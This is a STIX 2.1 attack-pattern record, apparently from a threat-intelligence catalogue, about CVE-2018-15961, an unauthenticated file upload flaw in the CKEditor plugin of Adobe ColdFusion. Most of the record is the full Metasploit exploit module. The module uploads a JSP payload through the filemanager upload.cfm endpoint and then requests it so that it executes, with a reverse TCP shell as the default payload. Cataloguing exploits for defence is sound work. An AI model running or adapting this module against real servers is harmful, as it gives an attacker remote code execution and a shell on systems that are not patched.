{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a7317ff1-a124-4337-80ce-2f5a35168b41",
    "created": "2024-08-14T17:11:19.684726Z",
    "modified": "2024-08-14T17:11:19.684729Z",
    "name": "Adobe ColdFusion CKEditor unrestricted file upload",
    "description": " A file upload vulnerability in the CKEditor of Adobe ColdFusion 11 (Update 14 and earlier), ColdFusion 2016 (Update 6 and earlier), and ColdFusion 2018 (July 12 release) allows unauthenticated remote attackers to upload and execute JSP files through the filemanager plugin. Tested on Adobe ColdFusion 2018.0.0.310739. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/coldfusion_ckeditor_file_upload.rb",
            "external_id": "coldfusion_ckeditor_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15961"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/fr/security/products/coldfusion/apsb18-33.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  include Msf::Exploit::Remote::HttpClient\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Adobe ColdFusion CKEditor unrestricted file upload',\n      'Description'     => %q{\n        A file upload vulnerability in the CKEditor of Adobe ColdFusion 11\n        (Update 14 and earlier), ColdFusion 2016 (Update 6 and earlier), and\n        ColdFusion 2018 (July 12 release) allows unauthenticated remote\n        attackers to upload and execute JSP files through the filemanager\n        plugin.\n        Tested on Adobe ColdFusion 2018.0.0.310739.\n      },\n      'Author'          =>\n        [\n          'Pete Freitag de Foundeo',  # Vulnerability discovery\n          'Vahagn vah_13 Vardanian',  # First public PoC\n          'Qazeer'                    # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'CVE', '2018-15961' ],\n          [ 'BID', '105314' ],\n          [ 'URL', 'https://helpx.adobe.com/fr/security/products/coldfusion/apsb18-33.html' ]\n        ],\n      'Privileged'      => false,\n      'Platform'        => %w{ linux win },\n      'Arch'            => ARCH_JAVA,\n      'Targets'         =>\n        [\n          [ 'Java Universal',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Platform' => %w{ linux win },\n              'Payload'  => { 'DisableNops' => true },\n              'DefaultOptions' => {'PAYLOAD' => 'java/jsp_shell_reverse_tcp'}\n            }\n          ]\n        ],\n      'DefaultTarget'   => 0,\n      'DefaultOptions'  => { 'RPORT' => 8500 },\n      'DisclosureDate'  => '2018-09-11'\n    ))\n\n    register_options [\n      OptString.new('TARGETURI', [ false, 'Base application path', '/' ]),\n    ]\n  end\n\n  def exploit\n    filename = rand_text_alpha_upper(1..10) + '.jsp'\n\n    print_status(\"Uploading the JSP payload at #{target_uri}cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/#{filename}...\")\n\n    mime = Rex::MIME::Message.new\n    mime.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"file\\\"; filename=\\\"#{filename}\\\"\")\n    mime.add_part('path', 'text/plain', nil, 'form-data; name=\"path\"')\n\n    post_str = mime.to_s\n    post_str.strip!\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(target_uri, 'cf_scripts','scripts','ajax','ckeditor','plugins','filemanager','upload.cfm'),\n      'version' => '1.1',\n      'method'  => 'POST',\n      'ctype'   => 'multipart/form-data; boundary=' + mime.bound,\n      'data'    => post_str,\n    })\n\n    unless res && res.code == 200\n      fail_with Failure::Unknown, 'Upload Failed...'\n    end\n\n    print_good('Upload succeeded! Executing payload...')\n\n    send_request_cgi({\n      'uri'     => normalize_uri(target_uri, 'cf_scripts', 'scripts', 'ajax',\n                    'ckeditor', 'plugins', 'filemanager', 'uploadedFiles', filename),\n      'method' => 'GET'\n    }, 5)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-09-11",
    "x_mitre_platforms": [
        "%w{ linux win }"
    ]
}